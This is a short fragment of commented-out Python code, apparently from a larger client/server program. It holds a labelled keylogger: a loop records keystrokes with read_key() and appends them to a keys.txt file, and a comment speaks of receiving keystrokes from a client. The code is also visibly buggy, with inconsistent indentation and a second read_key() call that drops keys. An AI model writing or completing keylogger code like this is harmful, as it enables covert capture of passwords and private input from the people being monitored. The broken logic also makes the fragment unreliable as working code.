# #method to recv keystrokes from the client
# def keystrokes(self):
#     try:
#         with open("keys.txt", "a") as f:
#             for self.letter in self.keys:
#                 f.write(self.letter + ", ")
#     except:
#         print("keystroke error occured")
# #keylogger starts here
#     def listener(self):
#         self.final = []
#         while True:
#             self.keys = read_key()
#             self.final.append(self.keys)
#             if read_key() == "q":
#                 break
#             self.keystrokes()
            
#         print(self.final)
#         print(len(self.final))
# #keylogger ends here